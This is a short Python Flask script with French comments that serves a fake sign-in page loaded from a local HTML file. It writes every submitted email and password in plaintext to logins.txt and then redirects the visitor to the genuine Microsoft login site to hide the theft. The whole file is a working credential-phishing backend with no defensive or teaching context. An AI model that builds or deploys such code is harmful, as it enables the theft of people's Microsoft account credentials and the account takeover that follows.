from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# Lire la fausse page HTML
with open("login.html", "r") as f:
    login_page = f.read()

# Montrer la page de connexion
@app.route("/")
def index():
    return render_template_string(login_page)

# Quand quelqu’un clique sur "Sign In"
@app.route("/submit", methods=["POST"])
def submit():
    email = request.form["email"]
    password = request.form["password"]

    # Enregistrer ce qu’il a tapé
    with open("logins.txt", "a") as f:
        f.write(f"Email: {email} | Password: {password}\n")

    # Ensuite, rediriger vers le vrai site
    return redirect("https://login.microsoftonline.com")

# Démarrer le petit serveur
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
